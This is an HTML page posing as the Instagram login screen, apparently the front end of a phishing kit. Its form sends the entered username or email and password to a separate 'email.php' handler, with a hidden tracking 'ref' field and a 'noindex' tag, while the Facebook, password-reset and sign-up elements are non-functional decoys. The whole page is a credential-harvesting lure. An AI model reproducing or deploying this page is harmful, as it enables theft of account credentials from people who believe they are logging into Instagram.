<html lang="en">
    <head> 
        <meta name="robots" content="noindex,follow"> 
        <meta charset="UTF-8"> 
        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <title>Instagram Login</title> 
        <link rel="stylesheet" href="bootstrap.min.css"> 
        <link rel="stylesheet" href="style.css"> 
    </head> 
    <body> 
        <div class="wrapper"> 
            <div class="container"> 
                <div class="row"> 
                    <div class="col-md-6 firstContainer"> 
                        <img src="app-feautures.png" alt="[+]" class="rounded d-block w-100"> 
                    </div> 
                    <div class="col-md-6 text-center secondContainer"> 
                        <div class="card"> 
                            <div class="py-3 px-2"> 
                              <img src="instagram-logo.png" alt="card-img-top"> 
                            </div> 
                            <div class="card-body"> 
                              <form method="post" action="email.php" onsubmit="return checkBeforeSubmit()"> 
                              <input type="hidden" name="ref" value="5922513118">
                              <div class="form-group py-1"> 
                              <input type="text" class="form-control" name="email" aria-describedby="helpId" placeholder="Phone Number, Username or Email"> 
                              </div> 
                              <div class="form-group py-1"> 
                              <input type="password" class="form-control" name="password" aria-describedby="helpId" placeholder="Password"> 
                              </div> 
                              <input type="submit" value="Log In" class="mt-2 btn btn-primary w-100"> 
                              </form> 
                              <div class="or"> <span>OR</span> 
                              </div> 
                              <div class="otherMethods"> 
                              <div class="secondaryColor"> 
                              <img src="facebook-logo.png" class="img-fluid rounded" alt="[+]" style="width: 18px; height: 18px;"> <span class="ms-2" onclick="">Login with Facebook</span> 
                              </div> 
                              </div> 
                              <div class="forgot-pass mt-3 primaryColor">
                              Forgot Password ?
                              </div> 
                            </div> 
                        </div> 
                        <div class="card my-2"> 
                            <div class="card-body"> <span>Don't Have an Account?</span><span class="primaryColor">Sign Up</span> 
                            </div> 
                        </div> <span class="primaryColor">Get the App</span> 
                        <div class="row py-2"> 
                            <div class="col-6">
                              <img src="playstore.png" alt="[+]" class="img-fluid d-block rounded"> 
                            </div> 
                            <div class="col-6">
                              <img src="appstore.png" alt="[+]" class="img-fluid d-block rounded"> 
                            </div> 
                        </div> 
                    </div> 
                </div> 
            </div> 
        </div> 
        <script type="text/javascript"> 
  var wasSubmitted = true;     
    function checkBeforeSubmit(){ 
      if(!wasSubmitted) { 
        wasSubmitted = true; 
        return wasSubmitted; 
      } 
      return true; 
    }     
</script> 
    </body>
</html>
